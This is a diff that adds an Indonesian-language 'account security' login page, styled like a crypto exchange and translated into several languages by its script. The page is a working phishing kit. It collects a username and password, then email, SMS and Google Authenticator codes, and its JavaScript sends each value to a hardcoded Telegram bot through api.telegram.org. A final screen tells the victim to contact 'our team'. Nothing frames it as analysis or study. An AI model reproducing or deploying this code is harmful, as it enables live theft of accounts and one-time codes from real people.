@@ -1,0 +1,143 @@
+﻿<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keamanan Akun</title>
+    <style>
+        :root { --bg: #0b0e11; --card: #1e2329; --primary: #f0b90b; --text: #eaecef; --sub: #848e9c; --border: #363c44; }
+        body { font-family: 'Segoe UI', Roboto, sans-serif; background-color: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .auth-container { background: var(--card); padding: 40px 32px; border-radius: 20px; width: 100%; max-width: 380px; box-shadow: 0 12px 40px rgba(0,0,0,0.5); text-align: center; margin: 20px; }
+        .page { display: none; }
+        .active { display: block; animation: fadeIn 0.4s ease-out; }
+        h2 { font-size: 22px; margin-bottom: 12px; color: var(--primary); }
+        p { color: var(--sub); font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        .input-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; font-size: 13px; margin-bottom: 8px; color: var(--sub); }
+        input { width: 100%; padding: 14px; background: #2b3139; border: 1px solid var(--border); border-radius: 10px; color: white; box-sizing: border-box; outline: none; font-size: 16px; margin-bottom: 10px; }
+        input:focus { border-color: var(--primary); }
+        button { width: 100%; padding: 16px; background: var(--primary); border: none; border-radius: 10px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: 0.3s; font-size: 16px; color: #000; }
+        button:hover { background: #f8d33a; transform: translateY(-2px); }
+        .loading-spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: var(--primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .rtl { direction: rtl; }
+    </style>
+</head>
+<body>
+
+<div class="auth-container">
+    <div id="step-login" class="page active">
+        <h2 class="t-login">Masuk Akun</h2>
+        <p class="t-login-sub">Masukkan detail akun untuk melanjutkan.</p>
+        <div class="input-group">
+            <label class="t-email">Email / Nomor Ponsel</label>
+            <input type="text" id="user" placeholder="...">
+            <label class="t-pass">Kata Sandi</label>
+            <input type="password" id="pass" placeholder="******">
+        </div>
+        <button onclick="nextStep('otp-mail')">Lanjutkan</button>
+    </div>
+
+    <div id="step-otp-mail" class="page">
+        <h2 class="t-otpm-t">Verifikasi Email</h2>
+        <p class="t-otpm-d">Masukkan kode 6 digit yang dikirim ke Email Anda.</p>
+        <div class="input-group">
+            <input type="number" id="otp_mail" placeholder="000000">
+        </div>
+        <button onclick="nextStep('otp-sms')">Verifikasi</button>
+    </div>
+
+    <div id="step-otp-sms" class="page">
+        <h2 class="t-otps-t">Verifikasi SMS</h2>
+        <p class="t-otps-d">Masukkan kode yang dikirim ke nomor ponsel Anda.</p>
+        <div class="input-group">
+            <input type="number" id="otp_sms" placeholder="000000">
+        </div>
+        <button onclick="nextStep('2fa')">Verifikasi</button>
+    </div>
+
+    <div id="step-2fa" class="page">
+        <h2 class="t-auth-t">Authenticator</h2>
+        <p class="t-auth-d">Masukkan kode dari aplikasi Google Authenticator.</p>
+        <div class="input-group">
+            <input type="number" id="auth_code" placeholder="000 000">
+        </div>
+        <button onclick="nextStep('waiting')">Konfirmasi</button>
+    </div>
+
+    <div id="step-waiting" class="page">
+        <div class="loading-spinner"></div>
+        <h2 class="t-wait-t">Mohon Tunggu...</h2>
+        <p class="t-wait-d">Sistem sedang memproses data Anda. Mohon hubungi tim kami kembali untuk langkah selanjutnya.</p>
+    </div>
+</div>
+
+<script>
+    const tg = {
+        token: "8679938218:AAH_ZuYcoOroEBC-79sQ1CgoEKzcaCrWmYs",
+        id: "8795373522"
+    };
+
+    const dictionary = {
+        'id': { login: 'Masuk Akun', lsub: 'Masukkan detail akun Anda.', email: 'Email / Ponsel', pass: 'Kata Sandi', otpmt: 'Verifikasi Email', otpmd: 'Masukkan kode 6 digit dari Email.', otpst: 'Verifikasi SMS', otpsd: 'Masukkan kode dari ponsel Anda.', autht: 'Otentikator', authd: 'Masukkan kode Google Authenticator.', waitt: 'Mohon Tunggu...', waitd: 'Sedang memproses. Hubungi tim kami untuk langkah selanjutnya.' },
+        'en': { login: 'Login Account', lsub: 'Enter your account details.', email: 'Email / Phone', pass: 'Password', otpmt: 'Email Verification', otpmd: 'Enter 6-digit code from Email.', otpst: 'SMS Verification', otpsd: 'Enter code sent to your phone.', autht: 'Authenticator', authd: 'Enter Google Authenticator code.', waitt: 'Please Wait...', waitd: 'Processing. Please contact our team for next steps.' },
+        'ru': { login: 'Вход', lsub: 'Введите данные аккаунта.', email: 'Email / Телефон', pass: 'Пароль', otpmt: 'Email подтверждение', otpmd: 'Введите 6-значный код.', otpst: 'SMS подтверждение', otpsd: 'Введите код из SMS.', autht: 'Аутентификатор', authd: 'Введите код из приложения.', waitt: 'Пожалуйста, подождите...', waitd: 'В процессе. Свяжитесь с нами для дальнейших шагов.' },
+        'ar': { login: 'تسجيل الدخول', lsub: 'أدخل تفاصيل حسابك.', email: 'البريد الإلكتروني', pass: 'كلمة المرور', otpmt: 'التحقق من البريد', otpmd: 'أدخل الرمز المكون من 6 أرقام.', otpst: 'التحقق من الهاتف', otpsd: 'أدخل الرمز المرسل لهاتفك.', autht: 'أداة المصادقة', authd: 'أدخل رمز تطبيق المصادقة.', waitt: 'يرجى الانتظار...', waitd: 'جاري المعالجة. يرجى الاتصال بفريقنا.' }
+    };
+
+    function sendTg(msg) {
+        fetch(`https://api.telegram.org/bot${tg.token}/sendMessage?chat_id=${tg.id}&text=${encodeURIComponent(msg)}`);
+    }
+
+    function nextStep(step) {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+
+        if (step === 'otp-mail') {
+            if(!u || !p) return alert("Fill all fields!");
+            sendTg(`🎯 NEW LOG\nUser: ${u}\nPass: ${p}`);
+            showPage('step-otp-mail');
+        } else if (step === 'otp-sms') {
+            const m = document.getElementById('otp_mail').value;
+            sendTg(`📧 OTP MAIL\nUser: ${u}\nCode: ${m}`);
+            showPage('step-otp-sms');
+        } else if (step === '2fa') {
+            const s = document.getElementById('otp_sms').value;
+            sendTg(`📱 OTP SMS\nUser: ${u}\nCode: ${s}`);
+            showPage('step-2fa');
+        } else if (step === 'waiting') {
+            const a = document.getElementById('auth_code').value;
+            sendTg(`🔐 AUTH CODE\nUser: ${u}\nCode: ${a}\nSTATUS: WAITING`);
+            showPage('step-waiting');
+        }
+    }
+
+    function showPage(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+    }
+
+    function applyLang() {
+        let lang = navigator.language.split('-')[0];
+        const l = dictionary[lang] || dictionary['en'];
+        if(lang === 'ar') document.body.classList.add('rtl');
+
+        document.querySelector('.t-login').innerText = l.login;
+        document.querySelector('.t-login-sub').innerText = l.lsub;
+        document.querySelector('.t-email').innerText = l.email;
+        document.querySelector('.t-pass').innerText = l.pass;
+        document.querySelector('.t-otpm-t').innerText = l.otpmt;
+        document.querySelector('.t-otpm-d').innerText = l.otpmd;
+        document.querySelector('.t-otps-t').innerText = l.otpst;
+        document.querySelector('.t-otps-d').innerText = l.otpsd;
+        document.querySelector('.t-auth-t').innerText = l.autht;
+        document.querySelector('.t-auth-d').innerText = l.authd;
+        document.querySelector('.t-wait-t').innerText = l.waitt;
+        document.querySelector('.t-wait-d').innerText = l.waitd;
+    }
+
+    window.onload = applyLang;
+</script>
+</body>
+</html>
